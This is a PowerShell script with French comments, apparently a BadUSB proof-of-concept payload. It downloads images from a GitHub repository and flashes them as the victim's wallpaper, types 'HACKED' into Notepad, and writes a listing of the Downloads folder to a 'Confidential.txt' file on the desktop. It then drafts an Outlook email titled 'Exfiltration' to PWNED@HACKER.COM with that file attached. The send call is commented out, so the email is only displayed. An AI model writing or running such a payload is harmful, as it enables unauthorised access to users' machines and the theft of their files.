function Payload_Launch {

    CreateWarningSlideshow
    OpenNotepad
    DownloadsTree
    OutlookNewMail

}

function OpenNotepad {
    # Open Notepad
    Start-Process notepad
    Start-Sleep -Seconds 2
    
    # Writes the specified text
    $wshell = New-Object -ComObject wscript.shell
    $wshell.AppActivate('Notepad')
    $wshell.SendKeys("

##     ##    ###     ######  ##    ## ######## ########  
##     ##   ## ##   ##    ## ##   ##  ##       ##     ## 
##     ##  ##   ##  ##       ##  ##   ##       ##     ## 
######### ##     ## ##       #####    ######   ##     ## 
##     ## ######### ##       ##  ##   ##       ##     ## 
##     ## ##     ## ##    ## ##   ##  ##       ##     ## 
##     ## ##     ##  ######  ##    ## ######## ########  

  `r`n")
    Start-Sleep -Seconds 5

    # Fermer le Bloc-notes directement via le processus
    $notepad = Get-Process notepad -ErrorAction SilentlyContinue
    if ($notepad) {
        $notepad.Kill()
    }
}

function CreateWarningSlideshow {
    # Prendre le nom d'utilisateur et le stocker
    $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    # Chemin du dossier "WARNING" sur le bureau
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $warningFolderPath = Join-Path $desktopPath "WARNING"

    # Créer le dossier "WARNING" s'il n'existe pas
    if (-not (Test-Path $warningFolderPath)) {
        New-Item -Path $warningFolderPath -ItemType Directory | Out-Null
    }

    # Prendre le fond d'écran actuel et le stocker dans le dossier "WARNING"
    $currentWallpaperPath = (Get-ItemProperty 'HKCU:\Control Panel\Desktop\' -Name WallPaper).WallPaper
    $currentWallpaperFilename = [System.IO.Path]::GetFileName($currentWallpaperPath)
    $backupWallpaperPath = Join-Path $warningFolderPath $currentWallpaperFilename
    Copy-Item -Path $currentWallpaperPath -Destination $backupWallpaperPath -ErrorAction SilentlyContinue

    # URLs des images pour le diaporama
    $imageURLs = @(
        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/1.jpeg",
        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/2.jpg",
        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/3.jpg",
        "https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/RubberDucky_PoC/4.jpg"
    )

    # Télécharger les images dans le dossier "WARNING" avec l'extension correcte
    $downloadedImages = @()
    foreach ($url in $imageURLs) {
        $filename = [System.IO.Path]::GetFileNameWithoutExtension($url)
        $extension = [System.IO.Path]::GetExtension($url)
        $destinationPath = Join-Path $warningFolderPath "$filename$extension"
        Invoke-WebRequest -Uri $url -OutFile $destinationPath
        $downloadedImages += $destinationPath
    }

    # Mettre en place le diaporama comme fond d'écran
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

    # Durée totale du diaporama en secondes (2 secondes par image, 4 images)
    $displayDuration = 2  # 2 seconds per image

    # Loop pendant 8 secondes (8 seconds total)
    $endTime = [DateTime]::Now.AddSeconds(8)
    while ([DateTime]::Now -lt $endTime) {
        foreach ($image in $downloadedImages) {
            [Wallpaper]::SystemParametersInfo(0x0014, 0, $image, 0x0001 -bor 0x0002)
            Start-Sleep -Seconds $displayDuration
        }
    }

    # Remettre le fond d'écran original
    [Wallpaper]::SystemParametersInfo(0x0014, 0, $backupWallpaperPath, 0x0001 -bor 0x0002)
}


function DownloadsTree {
    # Chemin du dossier Téléchargements
    $downloadsPath = [Environment]::GetFolderPath('UserProfile') + "\Téléchargements"

    # Chemin du fichier Confidential.txt sur le bureau
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $outputFilePath = Join-Path $desktopPath "Confidential.txt"

    # Exécuter la commande 'tree' et rediriger la sortie vers Confidential.txt
    cmd.exe /c "tree /F /A `$downloadsPath > `$outputFilePath"

    # Message de confirmation
    Write-Host "Le contenu du dossier Téléchargements a été listé dans $outputFilePath"
}

function OutlookNewMail {
    # Créer un nouvel objet Outlook
    $olApp = New-Object -ComObject Outlook.Application
    $mailItem = $olApp.CreateItem(0) # 0: olMailItem

    # Définir les propriétés de l'email
    $mailItem.To = "PWNED@HACKER.COM"
    $mailItem.Subject = "Exfiltration"
    $mailItem.Body = @"
######## ##     ## ######## #### ##       ######## ########     ###    ######## ####  #######  ##    ## 
##        ##   ##  ##        ##  ##          ##    ##     ##   ## ##      ##     ##  ##     ## ###   ## 
##         ## ##   ##        ##  ##          ##    ##     ##  ##   ##     ##     ##  ##     ## ####  ## 
######      ###    ######    ##  ##          ##    ########  ##     ##    ##     ##  ##     ## ## ## ## 
##         ## ##   ##        ##  ##          ##    ##   ##   #########    ##     ##  ##     ## ##  #### 
##        ##   ##  ##        ##  ##          ##    ##    ##  ##     ##    ##     ##  ##     ## ##   ### 
######## ##     ## ##       #### ########    ##    ##     ## ##     ##    ##    ####  #######  ##    ##
"@

    # Ajouter la pièce jointe "Confidential.zip" située sur le bureau
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $attachmentPath = Join-Path $desktopPath "Confidential.txt"
    if (Test-Path $attachmentPath) {
        $mailItem.Attachments.Add($attachmentPath)
    } else {
        Write-Host "Pièce jointe non trouvée : $attachmentPath"
    }

    # Afficher l'email (optionnel) et envoyer l'email
    $mailItem.Display()  # Affiche l'email (vous pouvez le commenter si vous voulez envoyer directement)
    # $mailItem.Send()   # Envoyer l'email directement (décommenter cette ligne pour envoyer l'email)
}

Payload_Launch
